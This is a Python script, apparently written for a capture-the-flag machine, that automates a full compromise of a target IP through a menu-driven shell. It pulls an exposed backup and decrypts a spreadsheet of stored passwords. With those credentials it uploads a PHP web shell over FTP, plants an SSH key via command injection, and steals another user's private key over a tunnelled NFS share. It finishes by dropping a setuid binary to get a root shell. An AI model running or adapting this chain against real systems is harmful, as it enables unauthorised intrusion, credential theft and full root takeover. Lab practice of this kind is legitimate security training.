#!/usr/bin/env python3

import cmd
import requests
import argparse
import zipfile
import os
import pandas
import gnupg
import json
import paramiko
import getpass
import subprocess

from pathlib import Path
from ftplib import FTP
from sshtunnel import SSHTunnelForwarder

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("--ip", required=True, help="The IP of the target")
	parser.add_argument("--privesc_path", required=False, default="privesc.c", help="The path of the C source code to run as root on the target system")

	args = parser.parse_args()
	return args

class Exploit:
	def __init__(self):
		self.args = parse_args()
		self.backups_url = f"http://{self.args.ip}/backups/backup.zip"
		self.cmd_url = f"http://{self.args.ip}/shell.php"

	def fetch_credentials(self):
		r = requests.get(self.backups_url)
		with open("backup.zip", 'wb') as handle:
			handle.write(r.content)

		with zipfile.ZipFile("backup.zip", 'r') as zip_ref:
			try:
				os.mkdir("credentials")
			except FileExistsError:
				pass
			zip_ref.extractall("credentials")

		gpg = gnupg.GPG(gnupghome=f"{os.getenv('PWD')}/credentials")
		key = open("credentials/priv.key").read()
		import_result = gpg.import_keys(key)

		with open("credentials/CustomerDetails.xlsx.gpg", "rb") as handle:
			status = gpg.decrypt_file(handle, output="credentials/CustomerDetails.xlsx")

		file = Path("credentials", "CustomerDetails.xlsx")
		all_lines = pandas.read_excel(file)
		passwords = json.loads(pandas.DataFrame(all_lines, columns=["Username", "Password"]).to_json(orient="split"))

		self.creds = []
		for credentials in passwords["data"]:
			formatted = f"{credentials[0]}:{credentials[1]}" # Format: `USERNAME:PASSWORD`
			self.creds.append(formatted)

		print(f"[+] Successfully retrieved credentials: {self.creds}")

	def upload_shell(self):
		with open("shell.php" , 'w') as handle:
			php_shell = "<?php system($_REQUEST['command']); ?>"
			handle.write(php_shell)

		file_object = open("shell.php", "rb")

		for entry in self.creds:
			username = entry.split(':')[0]
			password = entry.split(':')[1]

			try:
				print(f"[*] Trying to log in with {username}:{password}")
				with FTP(self.args.ip, user=username, passwd=password) as ftp:
					print(f"[+] Successfully logged in as {username}")

					print(f"[*] Attempting to upload shell to web-server")
					ftp.storlines("STOR shell.php", file_object)
					print(f"[+] Uploaded shell")

					print()
					return [username, password]
			except Exception as e:
				print(e)
				continue

	def web_exec(self, cmd):
		# urlsafe_cmd = urllib.parse.quote(cmd)
		req = requests.post(
			self.cmd_url, data={
				"command": cmd
			}
		)

		if req.text:
			print(req.text)
		else:
			return

	def autorun(self):
		self.fetch_credentials()
		self.upload_shell()

		pubkey = open(f"{os.getenv('HOME')}/.ssh/id_rsa.pub").read()

		print("[*] Attempting to upload SSH-key to target")
		self.web_exec(f"echo {self.creds[0].split(':')[1]} | su - {self.creds[0].split(':')[0]} -c 'mkdir ~/.ssh/; echo \"{pubkey}\" > ~/.ssh/authorized_keys'") # Gives access to `paradox` through ssh
		print("[+] SSH-key uploaded")

		self.ssh = paramiko.SSHClient()
		self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		username = self.creds[0].split(':')[0]
		password = self.creds[0].split(':')[1]
		path = f"{os.getenv('HOME')}/.ssh/id_rsa"
		key = paramiko.RSAKey.from_private_key_file(path)

		server = SSHTunnelForwarder(
			self.args.ip,
			ssh_username=username,
			ssh_pkey=key,
			remote_bind_address=("127.0.0.1", 2049)
		)

		print("[*] Starting SSH-Tunnel")

		server.start()

		print("[+] SSH-Tunnel started")
		local_port = server.local_bind_port
		nfs_path = "/dev/shm/nfs"

		try:
			os.mkdir(nfs_path)
		except FileExistsError:
			pass

		print("[*] Trying to mount NFS share")
		subprocess.check_call(f"sudo mount -t nfs -o proto=tcp,port={local_port} localhost:/ {nfs_path}", shell=True)
		print("[+] NFS share mounted")

		print("[*] Attempting to access `james`'s private SSH-key")
		james_key = os.popen(f"cat {nfs_path}/.ssh/id_rsa").read()
		with open("./james", 'w') as handle:
			handle.write(james_key)

		print("[+] `james`'s SSH-key acquired")

		os.popen(f"chmod 600 {os.getenv('PWD')}/james")

		print()

		print("[*] Compiling C -> binary")
		os.popen(f"gcc -w {os.getenv('PWD')}/privesc.c -o privesc")
		print("[+] Compiled source")

		print("[*] Copying binary to target")
		subprocess.check_call(f"sudo /bin/cp {os.getenv('PWD')}/privesc {nfs_path}/exp", shell=True)
		print("[+] Succesfully copied binary to target")

		print("[*] Making binary setuid")
		subprocess.check_call(f"sudo chmod +s {nfs_path}/exp", shell=True)
		print("[+] Succesfully made binary setuid")

		print("[*] Spawning root shell...")
		os.system(f"ssh -t -i james james@{self.args.ip} './exp'")

		subprocess.check_call(f"sudo umount {nfs_path}", shell=True)
		

class Term(cmd.Cmd):
	def __init__(self):
		self.exploit = Exploit()
		self.prompt = "[<>] "
		super().__init__()


	def do_root_shell(self, args):
		"""Fully exploits the vulnerable machine and spawns a root shell"""
		self.exploit.autorun()

	def do_fetch_credentials(self, args):
		"""Downloads the .xlsx file from web-server and gives credentials """
		self.exploit.fetch_credentials()

	def do_upload_shell(self, args):
		"""Uploads shell to web-server through ftp with credentials found"""
		self.exploit.upload_shell()

	def do_exit(self, args):
		quit()

	def do_quit(self, args):
		quit()


t = Term()
t.cmdloop()
